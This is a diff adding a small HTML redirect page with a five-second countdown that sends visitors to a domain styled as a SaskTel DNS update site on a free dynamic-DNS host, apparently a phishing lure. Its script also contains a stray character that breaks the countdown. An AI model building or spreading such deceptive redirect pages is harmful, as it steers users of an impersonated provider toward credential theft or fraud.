@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Redirecting...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Optional custom styles if needed, but Tailwind should cover most */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+    </style>
+</head>
+<body class="bg-white font-sans">
+    <div class="text-center p-4">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjKTFsM_sbMHVhr_x-6tWH1GNxZ_WdsZBmZ0yjTItF1A&s=10" alt="Redirecting" class="mx-auto mb-4 max-w-full h-auto rounded-lg shadow-md" />
+        <p id="redirectText" class="text-2xl md:text-3xl text-pink-500 cursor-pointer hover:text-pink-700 transition-colors duration-200 border-2 border-pink-500 px-4 py-2 inline-block rounded-lg font-bold">
+            Click here to continue (<span id="countdown">5</span>)
+        </p>
+    </div>
+
+    <script>
+        const countdownElement = document.getElementById('countdown');
+        const redirectTextElement = document.getElementById('redirectText');
+        let countdown = 5;
+        const redirectUrl = 'https://dnssasktelupdate.dpdns.org/'; // Change this to your desired URL
+
+        function updateCountdown() {
+            countdownElement.textContent = countdown;a
+            if (countdown === 0) {
+                window.location.href = redirectUrl;
+            } else {
+                countdown--;
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+
+        redirectTextElement.addEventListener('click', () => {
+            window.location.href = redirectUrl;
+        });
+
+        // Start the countdown when the page loads
+        window.onload = updateCountdown;
+    </script>
+</body>
+</html>
